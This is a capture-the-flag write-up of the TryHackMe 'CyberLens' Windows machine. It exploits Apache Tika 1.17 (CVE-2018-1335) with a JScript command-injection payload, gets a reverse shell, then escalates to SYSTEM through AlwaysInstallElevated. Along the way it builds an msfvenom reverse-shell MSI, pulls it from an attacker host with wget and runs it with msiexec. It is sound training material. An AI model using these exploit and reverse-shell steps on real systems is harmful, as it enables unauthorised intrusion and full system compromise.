# 🕵️ CyberLens

> **Windows Enumeration | Apache Tika 1.17 | CVE-2018-1335 | Remote Code Execution | Windows Privilege Escalation | AlwaysInstallElevated**

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-f9a825?style=flat-square&labelColor=555555)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-00a98f?style=flat-square&labelColor=555555)
![OS](https://img.shields.io/badge/OS-Windows-0078d4?style=flat-square&labelColor=555555)
![Vulnerability](https://img.shields.io/badge/Vulnerability-CVE--2018--1335-e63946?style=flat-square&labelColor=555555)
![Service](https://img.shields.io/badge/Service-HTTP%20%7C%2061777-008cc1?style=flat-square&labelColor=555555)

---

## 📋 Overview

**CyberLens** is a TryHackMe Windows machine focused on web enumeration, service fingerprinting, Apache Tika exploitation, remote code execution, Windows post-exploitation, and privilege escalation through the `AlwaysInstallElevated` policy.

### Attack Path

```text
Web Application
      ↓
Port Enumeration
      ↓
Port 61777
      ↓
Apache Tika 1.17
      ↓
CVE-2018-1335
      ↓
Remote Code Execution
      ↓
PowerShell Reverse Shell
      ↓
Windows Enumeration
      ↓
AlwaysInstallElevated
      ↓
Malicious MSI Payload
      ↓
msiexec
      ↓
NT AUTHORITY\SYSTEM
      ↓
Administrator Flag
```

---

# 🎯 Objectives
- Enumerate the target machine
- Identify exposed services
- Discover the Apache Tika service
- Identify Apache Tika 1.17
- Investigate the /meta endpoint
- Exploit CVE-2018-1335
- Obtain a reverse shell
- Retrieve the user flag
- Perform Windows privilege escalation enumeration
- Identify AlwaysInstallElevated
- Create a malicious MSI payload
- Execute the MSI with elevated privileges
- Obtain a SYSTEM shell
- Retrieve the administrator flag

---

# 🔎 1. Initial Web Enumeration

I first accessed the target through:

```
http://10.49.153.124
```

The website was titled:

```
CyberLens: Unveiling the Hidden Matrix
```

<img width="854" height="803" alt="2" src="https://github.com/user-attachments/assets/d832a211-3a12-44d1-930a-094a64ad7468" />

The application contained an image metadata extraction feature:
```
CyberLens Image Extractor
```
The application allowed users to upload an image and retrieve metadata.

The metadata functionality was interesting because it suggested that the application might rely on an external file-processing library.

---

# 🌐 2. Nmap Enumeration

I performed service and version detection:

```
nmap -sV -sC 10.49.153.124
```

The scan identified several Windows services:

```
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5985/tcp  open  http
```

The web server was identified as:

```
Apache httpd 2.4.57 ((Win64))
```
Nmap also identified the Windows environment:

```
NetBIOS_Domain_Name: CYBERLENS
NetBIOS_Computer_Name: CYBERLENS
DNS_Domain_Name: CyberLens
DNS_Computer_Name: CyberLens
```

<img width="806" height="702" alt="1" src="https://github.com/user-attachments/assets/64a2f2fe-7114-439b-95df-ab6385858526" />

---

🧪 3. Investigating the Metadata Endpoint

I inspected the application's traffic using **Burp Suite**.

The ```/meta``` endpoint was particularly interesting.

The observed request included:

```
OPTIONS /meta HTTP/1.1
Host: cyberlens.thm:61777
```

The request also indicated:

```
Access-Control-Request-Method: PUT
```

and:

```
Access-Control-Request-Headers: content-type
```

This indicated that another HTTP service was running on port ```61777```.

<img width="610" height="526" alt="3" src="https://github.com/user-attachments/assets/d87a8e19-80a5-400b-879b-263130790525" />

---

# 🔍 4. Enumerating Port 61777

I scanned port ```61777``` specifically:
```
nmap -sV -sC -p 61777 10.49.153.124
```
The result showed:
```
61777/tcp open http
```
The service was identified as:

Jetty 8.y.z-SNAPSHOT

The HTTP title revealed:
```
Welcome to the Apache Tika 1.17 Server
```
Nmap also reported:
```
Potentially risky methods: PUT
```

<img width="871" height="295" alt="4" src="https://github.com/user-attachments/assets/6746d0cc-b869-4a29-878b-6c8f34f6f248" />

---

# 📄 5. Apache Tika 1.17

I opened the service:
```
http://10.49.153.124:61777
```
The server explicitly identified itself as:
```
Welcome to the Apache Tika 1.17 Server
```
The page exposed several endpoints including:
```
/detect/stream
/detectors
```
The version was significant because Apache Tika 1.17 has known security issues.

<img width="869" height="377" alt="4-1" src="https://github.com/user-attachments/assets/75565b99-5494-47aa-9600-1812a993c123" />

---

# 💥 6. CVE-2018-1335

I investigated **CVE-2018-1335** and used a Python exploit targeting the vulnerable Apache Tika service.

The exploit accepted:
```
python exploit.py <host> <port> <command>
```
The script targeted:
```
/meta
```
and constructed a malicious request.

The exploit used a crafted JavaScript payload:
```
jscript = '''
var oShell = WScript.CreateObject("WScript.Shell");
var oExec = oShell.Exec('cmd /c {}');
'''.format(cmd)
```
The payload was then sent using an HTTP ```PUT``` request.

<img width="1189" height="587" alt="5" src="https://github.com/user-attachments/assets/9aef4258-b5e7-4a85-a83b-6b8360776826" />

---

# 🐚 7. Remote Code Execution

I executed the exploit against the Apache Tika service:
```
python3 exploit.py 10.49.153.124 61777 "<command>"
```
The command was a PowerShell reverse-shell payload.

<img width="1245" height="265" alt="5-1" src="https://github.com/user-attachments/assets/a010095a-230c-4934-ac92-791f55f28d2e" />

I started a listener on Kali:
```
nc -lvnp 443
```
The target connected back:
```
connect to [192.168.132.194] from (UNKNOWN) [10.49.153.124]
```
A PowerShell shell was obtained:
```
PS C:\Windows\system32>
```
This confirmed successful remote command execution on the Windows target.

<img width="583" height="133" alt="5-2" src="https://github.com/user-attachments/assets/c098c3e8-9e4e-48e1-bcb8-b72ce65af3fc" />

---

# 👤 8. Windows Enumeration

After obtaining command execution, I checked the current Windows identity:
```
whoami
```
I also checked the available privileges:
```
whoami /priv
```
The output included:
```
SeChangeNotifyPrivilege
SeIncreaseWorkingSetPrivilege
```
I also examined permissions on interesting files using:
```
icacls
```
---

# 🚩 9. User Flag

The user flag was located at:
```
C:\Users\CyberLens\Desktop\user.txt
```
I checked the file permissions:
```
icacls C:\Users\CyberLens\Desktop\user.txt
```
Then read the file:
```
type C:\Users\CyberLens\Desktop\user.txt
```
The flag obtained was:
```
THM{T1k4-CV3-f0r-7h3-w1n}
```

<img width="600" height="311" alt="6" src="https://github.com/user-attachments/assets/7ee77f5a-b74b-4cce-a6bc-f33e61535df8" />

---

# 🔐 10. Checking AlwaysInstallElevated

For privilege escalation, I checked the Windows Installer policy.

First:
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
The result:
```
AlwaysInstallElevated    REG_DWORD    0x1
```
I then checked the machine-wide policy:
```
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
The result was also:
```
AlwaysInstallElevated    REG_DWORD    0x1
```
Both registry locations being enabled indicated that MSI packages could be installed with elevated privileges.

<img width="919" height="158" alt="7-1" src="https://github.com/user-attachments/assets/07acd66a-d531-4cd7-bc9e-cfaa5cc4ebe1" />

---

# ⚔️ 11. Creating the MSI Payload

I generated a Windows reverse-shell MSI using msfvenom:
```
msfvenom -p windows/x64/shell_reverse_tcp \
LHOST=192.168.132.194 \
LPORT=4444 \
-f msi \
-o shell.msi
```
This created:
```
shell.msi
```

<img width="842" height="214" alt="7-2" src="https://github.com/user-attachments/assets/d00c24e6-9617-4748-aaf4-800298a44826" />

---

# 📤 12. Transferring the MSI

I started a Python HTTP server on Kali:
```
python3 -m http.server 8000
```
<img width="636" height="130" alt="8-2" src="https://github.com/user-attachments/assets/ab22392d-bcd5-454e-822f-73ec82cda4fe" />

On the Windows machine, I downloaded the MSI:
```
wget http://192.168.132.194:8000/shell.msi `-OutFile C:\Users\CyberLens\Desktop\shell.msi
```
I verified the file:
```
dir C:\Users\CyberLens\Desktop\shell.msi
```
The file was successfully transferred.
<img width="945" height="184" alt="8-1" src="https://github.com/user-attachments/assets/c9b4ee21-896e-43e9-8993-31c3d9056ad7" />

---

# 🚀 13. Executing the MSI

I started a listener on Kali:
```
nc -lvnp 4444
```
<img width="647" height="213" alt="9-2" src="https://github.com/user-attachments/assets/32187428-9626-4e90-9151-c1a45b8a660a" />

Then executed the MSI silently on the Windows target:
```
msiexec /quiet /qn /i C:\Users\CyberLens\Desktop\shell.msi
```
<img width="684" height="45" alt="9-1" src="https://github.com/user-attachments/assets/86340bed-ec32-4dda-85d8-5a6b1de258e2" />

Because both:
```
HKCU\...\AlwaysInstallElevated = 1
```
and:
```
HKLM\...\AlwaysInstallElevated = 1
```

were enabled, the MSI could execute with elevated privileges.

---

# 👑 14. SYSTEM Shell

The target connected back to the Kali listener:
```
connect to [192.168.132.194] from (UNKNOWN) [10.49.153.124]
```
I checked the current identity:
```
whoami
```
The result was:
```
nt authority\system
```
This confirmed successful privilege escalation to:
```
NT AUTHORITY\SYSTEM
```

---

# 🏆 15. Administrator Flag

With SYSTEM privileges, I accessed the administrator's desktop.

I checked the permissions:
```
icacls C:\Users\Administrator\Desktop\admin.txt
```
Then retrieved the flag:
```
type C:\Users\Administrator\Desktop\admin.txt
```
The flag obtained was:
```
THM{3lva0t3d-4-pr1v35c}
```

<img width="630" height="205" alt="10" src="https://github.com/user-attachments/assets/59645003-b9fc-4ae1-9076-abb207bc2023" />
